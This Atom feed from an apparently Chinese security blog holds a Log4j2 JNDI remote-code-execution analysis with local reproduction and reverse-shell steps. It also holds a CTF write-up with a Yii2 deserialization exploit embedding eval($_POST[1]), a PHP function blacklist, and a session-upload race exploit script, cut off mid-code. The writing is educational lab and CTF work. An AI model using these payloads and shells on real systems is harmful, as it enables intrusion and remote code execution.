<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Err0r</title>
  
  <subtitle>gyy</subtitle>
  <link href="https://err0r.top/atom.xml" rel="self"/>
  
  <link href="https://err0r.top/"/>
  <updated>2021-12-10T15:14:11.825Z</updated>
  <id>https://err0r.top/</id>
  
  <author>
    <name>Err0r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Log4j2 RCE漏洞代码浅析</title>
    <link href="https://err0r.top/article/log4jrce/"/>
    <id>https://err0r.top/article/log4jrce/</id>
    <published>2021-12-10T12:15:17.000Z</published>
    <updated>2021-12-10T15:14:11.825Z</updated>
    
    <content type="html"><![CDATA[<p>开摸</p><a id="more"></a><img src="/article/log4jrce/4E32FA68A576C51928C018DCF51FA1C9.jpg" class="" title="4E32FA68A576C51928C018DCF51FA1C9" loading="lazy"><p>Log4j2是一个基于Java的日志框架，Apache Log4j的重构版本。新增的 Lookups 方法设计用于通过多种途径动态引入外部变量，log4j2版本 &lt; log4j-2.15.0-rc2 可由JNDI注入实现远程代码执行。</p><p>转载请注明本文作者和地址。</p><hr><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建maven项目</p><img src="/article/log4jrce/image-20211210205230894.png" class="" title="image-20211210205230894" loading="lazy"><h3 id="创建完后"><a href="#创建完后" class="headerlink" title="创建完后"></a>创建完后</h3><img src="/article/log4jrce/image-20211210205154269.png" class="" title="image-20211210205154269" loading="lazy"><h3 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h3><pre class="language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-core&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;&lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.logging.log4j&#x2F;log4j-api --&gt;&lt;dependency&gt;&lt;groupId&gt;org.apache.logging.log4j&lt;&#x2F;groupId&gt;&lt;artifactId&gt;log4j-api&lt;&#x2F;artifactId&gt;&lt;version&gt;2.14.1&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</code></pre><img src="/article/log4jrce/image-20211210205406063.png" class="" title="image-20211210205406063" loading="lazy"><h3 id="新建两个class"><a href="#新建两个class" class="headerlink" title="新建两个class"></a>新建两个class</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : log4j */</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> log4j <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>log4j<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:ldap://127.0.0.1:1389/Log4jRCE&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span><span class="token comment">/* *    @Author: Err0r *    @date : 2021/12/10 *    @file : Log4jRCE */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Log4jRCE</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var0 <span class="token operator">=</span> <span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><img src="/article/log4jrce/image-20211210210755065.png" class="" title="image-20211210210755065" loading="lazy"><h3 id="开启http服务"><a href="#开启http服务" class="headerlink" title="开启http服务"></a>开启http服务</h3><pre class="language-sh" data-language="sh"><code class="language-sh">python3 -m http.server 8888</code></pre><img src="/article/log4jrce/image-20211210210848125.png" class="" title="image-20211210210848125" loading="lazy"><h3 id="到一个新的文件夹准备服务"><a href="#到一个新的文件夹准备服务" class="headerlink" title="到一个新的文件夹准备服务"></a>到一个新的文件夹准备服务</h3><pre class="language-sh" data-language="sh"><code class="language-sh">git clone git@github.com:mbechler&#x2F;marshalsec.git</code></pre><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><pre class="language-sh" data-language="sh"><code class="language-sh">mvn clean package -DskipTests</code></pre><h3 id="上服务"><a href="#上服务" class="headerlink" title="上服务"></a>上服务</h3><pre class="language-sh" data-language="sh"><code class="language-sh">java -cp target&#x2F;marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;#Log4jRCE&quot;</code></pre><img src="/article/log4jrce/image-20211210211207737.png" class="" title="image-20211210211207737" loading="lazy"><p>运行log4j.java</p><img src="/article/log4jrce/image-20211210212715616.png" class="" title="image-20211210212715616" loading="lazy"><h2 id="0x02-流程分析"><a href="#0x02-流程分析" class="headerlink" title="0x02 流程分析"></a>0x02 流程分析</h2><p>菜鸡蹩脚调试了半天，不知是否正确，还请大师傅们批评指正。</p><p>首先是一系列初始化操作，然后是我们的poc作为message传入<code>logMessage</code>(AbstractLogger.java)</p><img src="/article/log4jrce/image-20211210213200746.png" class="" title="image-20211210213200746" loading="lazy"><img src="/article/log4jrce/image-20211210213243728.png" class="" title="image-20211210213243728" loading="lazy"><p>然后进入<code>logMessageSafely</code></p><img src="/article/log4jrce/image-20211210213339178.png" class="" title="image-20211210213339178" loading="lazy"><p>接着进入<code>logMessageTrackRecursion</code></p><img src="/article/log4jrce/image-20211210213713378.png" class="" title="image-20211210213713378" loading="lazy"><p>指向<code>tryLogMessage</code></p><img src="/article/log4jrce/image-20211210213738925.png" class="" title="image-20211210213738925" loading="lazy"><p>再走到LoggerConfig的<code>log</code></p><img src="/article/log4jrce/image-20211210214044470.png" class="" title="image-20211210214044470" loading="lazy"><p>由<code>processLogEvent</code>来判定Event</p><img src="/article/log4jrce/image-20211210214104131.png" class="" title="image-20211210214104131" loading="lazy"><img src="/article/log4jrce/image-20211210214154131.png" class="" title="image-20211210214154131" loading="lazy"><p>在一系列跟进后发现了个<code>toSerializable</code>，里面用了它的format方法</p><img src="/article/log4jrce/image-20211210214359815.png" class="" title="image-20211210214359815" loading="lazy"><p>里面会对首尾判断是否满足<code>$&#123;xxx&#125;</code>逻辑</p><blockquote><p>// TODO can we optimize this? 很皮啊</p></blockquote><p>然后进入了<code>replace</code>,<code>substitute</code></p><img src="/article/log4jrce/image-20211210214639781.png" class="" title="image-20211210214639781" loading="lazy"><img src="/article/log4jrce/image-20211210214738016.png" class="" title="image-20211210214738016" loading="lazy"><p>调用了<code>StrSubtitutor</code>的<code>resolveVariable</code></p><img src="/article/log4jrce/image-20211210214846121.png" class="" title="image-20211210214846121" loading="lazy"><p>通过resolveVariable调用<code>lookup</code></p><img src="/article/log4jrce/image-20211210214939264.png" class="" title="image-20211210214939264" loading="lazy"><p>顺便研究一下<code>lookup</code></p><p>这里</p><pre class="language-none"><code class="language-none">prefix &#x3D; &quot;jndi&quot;name &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;lookup &#x3D; &#123;JndiLookup@2064&#125; </code></pre><p>这里从<code>strLookupMap</code>的map里提取了jndi的lookup，然后在jndi的lookup方法里成功开花</p><img src="/article/log4jrce/image-20211210222546722.png" class="" title="image-20211210222546722" loading="lazy"><p><code>return Objects.toString(jndiManager.lookup(jndiName), null)</code></p><p>这里就是<code>jndiManager.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210222738049.png" class="" title="image-20211210222738049" loading="lazy"><img src="/article/log4jrce/image-20211210222850555.png" class="" title="image-20211210222850555" loading="lazy"><pre class="language-none"><code class="language-none">return super.lookup(var1)</code></pre><p>也就是<code>super.lookup(&#39;ldap://127.0.0.1:1389/Log4jRCE&#39;)</code></p><img src="/article/log4jrce/image-20211210223114820.png" class="" title="image-20211210223114820" loading="lazy"><pre class="language-none"><code class="language-none">var1 &#x3D; &quot;ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Log4jRCE&quot;var2 (slot_2) &#x3D; &#123;ResolveResult@2676&#125; var3 (slot_3) &#x3D; &#123;LdapCtx@2677&#125; </code></pre><p>var2获取remote的class，即跳转到了我们之前编译的<code>Log4jRCE.class</code></p><img src="/article/log4jrce/image-20211210223755936.png" class="" title="image-20211210223755936" loading="lazy"><p>var3实例化，接着var3lookup，加载</p><img src="/article/log4jrce/image-20211210223337687.png" class="" title="image-20211210223337687" loading="lazy"><p>然后就不必多说了，直接执行，遍地开花</p><img src="/article/log4jrce/image-20211210223411156.png" class="" title="image-20211210223411156" loading="lazy"><hr><h2 id="0x03-题目"><a href="#0x03-题目" class="headerlink" title="0x03 题目"></a>0x03 题目</h2><p>在12月10日晚间 <a href="https://ctf.show/challenges#Log4j%E5%A4%8D%E7%8E%B0-1730">ctfshow</a>也上线了该漏洞的复现，利用思路如上，直接拿编译好的jar文件打</p><pre class="language-sh" data-language="sh"><code class="language-sh">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A [ip] -C &quot;[payload]&quot;</code></pre><p>记得payload最好base64编码一下，以免出错。</p><p>其实在今年早些时候V&amp;Nctf有道题也是<code>JNDI-Injection-Exploit</code></p><p><a href="https://err0r.top/article/VN2021ctf/?highlight=realezjvav">V&amp;N ctf realezjvav</a></p><p>我发现我服务器上竟然还有源码，直接打就行了</p><img src="/article/log4jrce/image-20211210224236428.png" class="" title="image-20211210224236428" loading="lazy"><h3 id="1-服务器先起监听"><a href="#1-服务器先起监听" class="headerlink" title="1.服务器先起监听"></a>1.服务器先起监听</h3><pre class="language-sh" data-language="sh"><code class="language-sh">nc -lvnp 1234</code></pre><img src="/article/log4jrce/image-20211210224502476.png" class="" title="image-20211210224502476" loading="lazy"><h3 id="2-起服务"><a href="#2-起服务" class="headerlink" title="2.起服务"></a>2.起服务</h3><pre class="language-sh" data-language="sh"><code class="language-sh">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A [ip] -C &quot;[payload]&quot;</code></pre><img src="/article/log4jrce/image-20211210224916380.png" class="" title="image-20211210224916380" loading="lazy"><h3 id="3-干它"><a href="#3-干它" class="headerlink" title="3.干它"></a>3.干它</h3><pre class="language-sh" data-language="sh"><code class="language-sh">$&#123;jndi:ldap:&#x2F;&#x2F;[ip]:[port]&#x2F;[xxxx]&#125;</code></pre><img src="/article/log4jrce/image-20211210224949536.png" class="" title="image-20211210224949536" loading="lazy"><p>直接弹到shell</p><img src="/article/log4jrce/image-20211210225033795.png" class="" title="image-20211210225033795" loading="lazy"><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/tangxiaofeng7/apache-log4j-poc">https://github.com/tangxiaofeng7/apache-log4j-poc</a></p><p><a href="https://github.com/udoless/apache-log4j-rce-poc">https://github.com/udoless/apache-log4j-rce-poc</a></p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>转载请注明本文作者和地址</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开摸&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2021祥云杯</title>
    <link href="https://err0r.top/article/2021xyb/"/>
    <id>https://err0r.top/article/2021xyb/</id>
    <published>2021-08-21T08:19:57.000Z</published>
    <updated>2021-09-03T08:07:32.368Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，祥云杯的wp</p><a id="more"></a><p>个人的最好成绩，web差一题ak了，当然题目也很简单就是啦。我主要是负责web方面的解题，队伍的wp也会在下面放出。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>题目打开写的很清楚，较新的链子，看了下是<a href="https://xz.aliyun.com/t/9948">yii2.0.42的1day漏洞</a></p><img src="/article/2021xyb/image-20210903132707299.png" class="" title="image-20210903132707299" loading="lazy"><p>原理不过多分析了，学弟在赛后写了个<a href="https://lxscloud.top/2021/08/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%9E%84%E9%80%A0POP%E9%93%BE/">分析</a>挺详细的，可以看看（学弟tql）</p><p>Exp:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7<span class="token punctuation">\</span>AppendStream</span><span class="token punctuation">;</span>    <span class="token keyword">class</span>  <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$output</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AppendStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">output</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jiang'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">DefaultGenerator</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">GuzzleHttp<span class="token punctuation">\</span>Psr7</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">AppendStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$streams</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$seekable</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">streams</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CachingStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">CachingStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$remoteStream</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">remoteStream</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token boolean constant">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">stream</span><span class="token operator">=</span><span class="token keyword">new</span>  <span class="token class-name">PumpStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">PumpStream</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$buffer</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">buffer</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DefaultGenerator</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'j'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"closure/autoload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//            $a = function()&#123;phpinfo();&#125;;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> \<span class="token package">Opis<span class="token punctuation">\</span>Closure<span class="token punctuation">\</span>serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>直接可以命令执行</p><img src="/article/2021xyb/image.png" class="" title="image" loading="lazy"><p>直接拿flag</p><hr><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><p><small>这题是完全是个人凭感觉自己做出来的，很欣慰，可惜没抢到血分</small></p><p>界面很花哨，随便登陆即可</p><p>看一下登陆的包</p><p>要跟随一个302跳转才能进去，检测网址过滤了file、flag关键字。</p><p>输入网址发现进了check2.php，根据报错得知是<code>file_get_contents($_POST[&#39;url1&#39;]);</code>这样的形式根据扫目录得到的结果，存在admin目录</p><p>直接访问会被403，所以利用检测网站打ssrf，检测然后预览看，打<code>http://127.0.0.1/admin/</code>，可以发现开启了目录遍历</p><img src="/article/2021xyb/image-20210903134546557.png" class="" title="image-20210903134546557" loading="lazy"><p>发现目录下有<code>include123.php</code>文件，读取得到源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"|file_put_content|file_get_content|fwrite|curl|system|eval|assert"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr"</span><span class="token punctuation">;</span><span class="token variable">$pattern</span> <span class="token punctuation">.</span><span class="token operator">=</span><span class="token double-quoted-string string">"|file|dict|gopher"</span><span class="token punctuation">;</span><span class="token comment">//累了累了，饮茶先</span><span class="token variable">$vpattern</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"|"</span><span class="token punctuation">,</span><span class="token variable">$pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$vpattern</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span> <span class="token double-quoted-string string">"/<span class="token interpolation"><span class="token variable">$value</span></span>/i"</span><span class="token punctuation">,</span> <span class="token variable">$u</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"检测到恶意字符"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>出题人真的苟，这么长一段黑名单，审查源码，可以读<code>/etc/passwd</code> 。但是ban了很多函数看上去根本不是想给机会rce。</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>仔细观察发现</p><p> 1.文件包含include </p><p> 2.u变量可控 </p><p> 3.可以任意文件读取使用了session，所以默认<code>/tmp/sess_id</code> 会存有session的信息，读取id对应的session发现存在</p><p>于是想到<code>PHP_SESSION_UPLOAD_PROGRESS漏洞</code></p><blockquote><p>php的session.use_strict_mode默认值为0，此时用户是可以自己定义Session ID的。<br>比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag（还有可能在 /var/lib/php/session里面）。即使此时用户没有初始化Session，PHP也会自动初始化Session。<br>产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p>如果我们在其中插入一句话木马，它就会被写入sess_xxx里</p><img src="/article/2021xyb/image-20210903135456923.png" class="" title="image-20210903135456923" loading="lazy"><p>但是默认情况下，session.upload_progress.cleanup是开启的，一旦读取了所有POST数据，它就会清除进度信息，那就没用了，他读取完了会清除数据，那我们的代码就执行不了。</p><p>所以需要使用条件竞争，要赶在他还没有读取完post包上传的数据的时候就访问到这个sess_xxx文件，执行里面的代码。</p></blockquote><p>直接从网上找exp修改，目的就是对个网页<code>check2.php</code>进行上传，这里填充了一堆<code>a</code>，让它去占用时间给我们条件竞争创造更多机会，利用ssrf打<code>include123.php</code>，参数<code>u</code>包含session文件来命令执行</p><p>exp：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 21, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> io<span class="token keyword">import</span> threadingbaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zefgf3p1ushlimyl69v.cloudeci1.ichunqiu.com/"</span>sessid <span class="token operator">=</span> <span class="token string">'gyy'</span>PAYLOAD <span class="token operator">=</span> <span class="token string">'&lt;?php eval(system(\'sh /getflag.sh\'));?>'</span><span class="token keyword">def</span> <span class="token function">getdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"url1"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/admin/include123.php?u=/tmp/sess_"</span> <span class="token operator">+</span> sessid<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># cookies = "PHPSESSID=123".split("; ")</span>    <span class="token comment"># cookie = &#123;&#125;</span>    <span class="token comment"># for i in cookies:</span>    <span class="token comment">#     cookie[i.split("=")[0]] = i.split("=")[1]</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>baseurl <span class="token operator">+</span> <span class="token string">"check2.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>baseurl <span class="token operator">+</span> <span class="token string">"preview.php"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token 